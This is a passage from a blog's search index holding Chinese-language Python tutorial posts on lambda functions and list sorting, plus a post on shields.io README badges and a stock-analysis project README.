class="hljs-built_in">print</span>(timeit.timeit(<span class="hljs-keyword">lambda</span> :run_sleep(<span class="hljs-number">2</span>),number=<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure><h4 id="熟悉下-lambda-的使用方法"><a href="#熟悉下-lambda-的使用方法" class="headerlink" title="熟悉下 lambda 的使用方法"></a>熟悉下 lambda 的使用方法</h4><p> Python3匿名函数lambda详解及使用示例<br>概述<br>匿名函数，顾名思义即没有名称的函数，和def定义的函数的最大区别在于匿名函数创建后返回函数本身（即匿名函数不需要return来返回值），表达式本身结果就是返回值，而def创建后则赋值给一个变量名，在Python中，我们利用关键词lambda创建匿名函数，以下是匿名函数lambda表达式的形式： lambda arg1,arg2,…..argn:expression 以下为一些lambda的特点：</p><p>lambda 是一个表达式，而不是一个语句，即我们可以在任何可以使用表达式的场景一样使用lambda。<br>lambda 的主体也是一个表达式，即和def定义的函数一样，lambda也有函数主体，不过lambda的主体仅仅是一个表达式，所以其使用的功能受到较大的限制。<br>‘’’</p><h4 id="lambda-匿名函数。"><a href="#lambda-匿名函数。" class="headerlink" title="lambda 匿名函数。"></a>lambda 匿名函数。</h4><h6 id="可以将lambda直接传递给一个变量，像调用一般函数一样使用"><a href="#可以将lambda直接传递给一个变量，像调用一般函数一样使用" class="headerlink" title="可以将lambda直接传递给一个变量，像调用一般函数一样使用"></a>可以将lambda直接传递给一个变量，像调用一般函数一样使用</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">B = <span class="hljs-keyword">lambda</span> :<span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(B())<br></code></pre></td></tr></table></figure><p> 等价于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BF</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(BF())<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sum_with_100 = <span class="hljs-keyword">lambda</span> x, y=<span class="hljs-number">100</span>: x + y<br><span class="hljs-comment"># 等同于：</span><br><span class="hljs-comment"># def sum_with_100(x, y=100): return x + y</span><br><span class="hljs-built_in">print</span>(sum_with_100(<span class="hljs-number">200</span>))<br><br></code></pre></td></tr></table></figure><p>从后面传参<br>之前的示例我们将lambda匿名函数赋值一个变量，通过类似def定义的函数的方式传参，我们可以在lambda后面直接传递参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">two_sum = (<span class="hljs-keyword">lambda</span> x, y: x + y)(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)<br><span class="hljs-built_in">print</span>(two_sum)<br><br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sum</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">lambda</span> y: x + y<br>sum_with_100 = <span class="hljs-built_in">sum</span>(<span class="hljs-number">100</span>)<br><span class="hljs-built_in">print</span>(sum_with_100)<br>result = sum_with_100(<span class="hljs-number">200</span>)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h5 id="1-结合三元表达式求两值中最小值"><a href="#1-结合三元表达式求两值中最小值" class="headerlink" title="1. 结合三元表达式求两值中最小值"></a>1. 结合三元表达式求两值中最小值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">lower = <span class="hljs-keyword">lambda</span> x,y: x <span class="hljs-keyword">if</span> x&lt;y <span class="hljs-keyword">else</span> y<br><span class="hljs-built_in">print</span>(lower(<span class="hljs-number">7</span>,<span class="hljs-number">100</span>))<br></code></pre></td></tr></table></figure><h5 id="2-对字典某一键值进行排序"><a href="#2-对字典某一键值进行排序" class="headerlink" title="2. 对字典某一键值进行排序"></a>2. 对字典某一键值进行排序</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">d = [&#123;<span class="hljs-string">&quot;order&quot;</span>:<span class="hljs-number">3</span>&#125;,&#123;<span class="hljs-string">&quot;order&quot;</span>:<span class="hljs-number">1</span>&#125;,&#123;<span class="hljs-string">&quot;order&quot;</span>:<span class="hljs-number">2</span>&#125;]<br><span class="hljs-comment"># 根据order键值排序</span><br>d.sort(key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-string">&#x27;order&#x27;</span>])<br><span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure><h4 id="result"><a href="#result" class="headerlink" title="result"></a>result</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-number">10.0492172</span><br><span class="hljs-literal">True</span><br><span class="hljs-literal">True</span><br><span class="hljs-number">300</span><br><span class="hljs-number">7</span><br>&lt;function <span class="hljs-built_in">sum</span>.&lt;<span class="hljs-built_in">locals</span>&gt;.&lt;<span class="hljs-keyword">lambda</span>&gt; at <span class="hljs-number">0x0000018272C56AF0</span>&gt;<br><span class="hljs-number">300</span><br><span class="hljs-number">7</span><br>[&#123;<span class="hljs-string">&#x27;order&#x27;</span>: <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-string">&#x27;order&#x27;</span>: <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-string">&#x27;order&#x27;</span>: <span class="hljs-number">3</span>&#125;]<br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>列表的高级排序</title>
      <link href="/2016/04/20/%E5%88%97%E8%A1%A8%E7%9A%84%E9%AB%98%E7%BA%A7%E6%8E%92%E5%BA%8F/"/>
      <url>/2016/04/20/%E5%88%97%E8%A1%A8%E7%9A%84%E9%AB%98%E7%BA%A7%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="按列表中元素的长度排序"><a href="#按列表中元素的长度排序" class="headerlink" title="按列表中元素的长度排序"></a>按列表中元素的长度排序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>x = [<span class="hljs-string">&#x27;xxxbdfxsdfasdfasdfsdfasdfasdfasdfasdf&#x27;</span>,<span class="hljs-string">&#x27;asdfj&#x27;</span>,<span class="hljs-string">&#x27;asdfsjadflk&#x27;</span>,<span class="hljs-string">&#x27;dfgadsfgdg&#x27;</span>,<span class="hljs-string">&#x27;dsfasdfasdfasdfasdf&#x27;</span>,<span class="hljs-string">&#x27;asdfasdfqwetyhjyhjghfj&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>x.sort(key=<span class="hljs-built_in">len</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>x<br>[<span class="hljs-string">&#x27;asdfj&#x27;</span>, <span class="hljs-string">&#x27;dfgadsfgdg&#x27;</span>, <span class="hljs-string">&#x27;asdfsjadflk&#x27;</span>, <span class="hljs-string">&#x27;dsfasdfasdfasdfasdf&#x27;</span>, <span class="hljs-string">&#x27;asdfasdfqwetyhjyhjghfj&#x27;</span>, <span class="hljs-string">&#x27;xxxbdfxsdfasdfasdfsdfasdfasdfasdfasdf&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><h4 id="反转排序"><a href="#反转排序" class="headerlink" title="反转排序"></a>反转排序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>x = [<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">76</span>,<span class="hljs-number">8</span>,<span class="hljs-number">435435</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1343</span>,<span class="hljs-number">43545</span>,<span class="hljs-number">1234</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>x.sort(reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>x<br>[<span class="hljs-number">435435</span>, <span class="hljs-number">43545</span>, <span class="hljs-number">1343</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">76</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>x.sort()<br><span class="hljs-meta">&gt;&gt;&gt; </span>x<br>[<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">76</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">1343</span>, <span class="hljs-number">43545</span>, <span class="hljs-number">435435</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><br><br><br><br><br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 列表，序列数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>editreadme</title>
      <link href="/2016/01/07/editreadme/"/>
      <url>/2016/01/07/editreadme/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://img.shields.io/badge/language-python3-brightgreen.svg?style=plastic" title="test" class="gallery-item"><img src="https://img.shields.io/badge/language-python3-brightgreen.svg?style=plastic" alt="test"></a></p><p><a href="https://travis-ci.org/meolu/docs.svg?branch=master" title="test" class="gallery-item"><img src="https://travis-ci.org/meolu/docs.svg?branch=master" alt="test"></a></p><p><a class="gallery-item"><img src = 'https://img.shields.io/github/license/zhuxinkai/python3-book-practice'></a></a></p><p><a href="https://img.shields.io/github/v/release/zhuxinkai/python3-book-practice?include_prereleases" title="GitHub release (latest by date including pre-releases)" class="gallery-item"><img src="https://img.shields.io/github/v/release/zhuxinkai/python3-book-practice?include_prereleases" alt="GitHub release (latest by date including pre-releases)"></a></p><p><a href="https://img.shields.io/github/languages/code-size/zhuxinkai/python3-book-practice" title="GitHub code size in bytes" class="gallery-item"><img src="https://img.shields.io/github/languages/code-size/zhuxinkai/python3-book-practice" alt="GitHub code size in bytes"></a></p><span id="more"></span><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">![test](https:<span class="hljs-comment">//img.shields.io/badge/language-python3-brightgreen.svg?style=plastic)</span><br><br>![test](https:<span class="hljs-comment">//travis-ci.org/meolu/docs.svg?branch=master)</span><br><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> = <span class="hljs-string">&#x27;https://img.shields.io/github/license/zhuxinkai/python3-book-practice&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br>其中的license 获取的是项目的LICENSE文件的内容。<br><br><br><br>![GitHub release (latest by date including pre-releases)](https:<span class="hljs-comment">//img.shields.io/github/v/release/zhuxinkai/python3-book-practice?include_prereleases)</span><br><br></code></pre></td></tr></table></figure><h1 id="从shields-io-网站获取的类表里面，可以通过读取github项目的，relsease-version-workflow-license-文件等生成项目的svg。-还包括了4中复制方式。（text-html-markdown-ascill-doc-当然，看到github也有相关的图标，没有去深入的看了。。"><a href="#从shields-io-网站获取的类表里面，可以通过读取github项目的，relsease-version-workflow-license-文件等生成项目的svg。-还包括了4中复制方式。（text-html-markdown-ascill-doc-当然，看到github也有相关的图标，没有去深入的看了。。" class="headerlink" title="从shields.io 网站获取的类表里面，可以通过读取github项目的，relsease ,version, workflow, license 文件等生成项目的svg。 还包括了4中复制方式。（text,html,markdown,ascill doc),当然，看到github也有相关的图标，没有去深入的看了。。"></a>从shields.io 网站获取的类表里面，可以通过读取github项目的，relsease ,version, workflow, license 文件等生成项目的svg。 还包括了4中复制方式。（text,html,markdown,ascill doc),当然，看到github也有相关的图标，没有去深入的看了。。</h1><p><a href="https://raw.githubusercontent.com/zhuxinkai/hexo-images/master/httpsshields.png" class="gallery-item"><img src="https://raw.githubusercontent.com/zhuxinkai/hexo-images/master/httpsshields.png" width=800  height =750  align=middle></a> </img></p><h1 id="stock-research"><a href="#stock-research" class="headerlink" title="stock-research"></a>stock-research</h1><h4 id="1-1-目标"><a href="#1-1-目标" class="headerlink" title="1.1 目标"></a>1.1 目标</h4><p>希望通过一些数据分析，能够获取到选取股票的一些方式。毕竟大盘的数据量太大。这个需要完全自动化的实现，并且，需要有好的报表进行展现到网页。</p><h6 id="2020年6月17日早-8：41-更新"><a href="#2020年6月17日早-8：41-更新" class="headerlink" title="2020年6月17日早 8：41 更新"></a>2020年6月17日早 8：41 更新</h6><h4 id="1-2-注意事项"><a href="#1-2-注意事项" class="headerlink" title="1.2 注意事项"></a>1.2 注意事项</h4><p>项目中的token 是 tushare网站注册而来，请想要用此项目的人员，自行替换相关的token.<br>不要使用自带的token .因为这个token 是本人使用。</p><h4 id="1-3-昨天看视频，量化分析。"><a href="#1-3-昨天看视频，量化分析。" class="headerlink" title="1.3 昨天看视频，量化分析。"></a>1.3 昨天看视频，量化分析。</h4><p>其中介绍如何通过python 进行股票的量化分析。虽然指标过于简单（仅仅根据市值大小来的排名来进行投资，是指排最小的前10位进行交易）<br>但是其中的思想还是很值得借鉴的。而且市值也是一个好的指标，形成一个复合，并配置不同的权重，最终得出相应的选股结论指标。。</p><h5 id="1-3-1-通过两天的观察，感觉，交易量增长2倍以上，是一个很好的卖出信号。。哈哈"><a href="#1-3-1-通过两天的观察，感觉，交易量增长2倍以上，是一个很好的卖出信号。。哈哈" class="headerlink" title="1.3.1     通过两天的观察，感觉，交易量增长2倍以上，是一个很好的卖出信号。。哈哈"></a>1.3.1     通过两天的观察，感觉，交易量增长2倍以上，是一个很好的卖出信号。。哈哈</h5><h1 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h1><h4 id="2-1-运行"><a href="#2-1-运行" class="headerlink" title="2.1 运行"></a>2.1 运行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 httprestful.py<br><br></code></pre></td></tr></table></figure><p>即可。其中的 emailmodule ,使用来发送结果的模块。。 date_fomat是用来格式化日期的。</p><h4 id="2-2-后续优化"><a href="#2-2-后续优化" class="headerlink" title="2.2 后续优化"></a>2.2 后续优化</h4><p>后续会在参数的输入可控，以及相应的输出图表化，或者文件化展示方面进行优化。</p><h6 id="2020年6月19日9：26更新"><a href="#2020年6月19日9：26更新" class="headerlink" title="2020年6月19日9：26更新"></a>2020年6月19日9：26更新</h6><a href="https://raw.githubusercontent.com/zhuxinkai/hexo-images/master/code-test.png" class="gallery-item"><img src ="https://raw.githubusercontent.com/zhuxinkai/hexo-images/master/code-test.png" width=800 height=600 align=middle></a></img></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> .md文件编辑 </tag>
            
            <tag> 图标(svg)in https://shields.io/ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
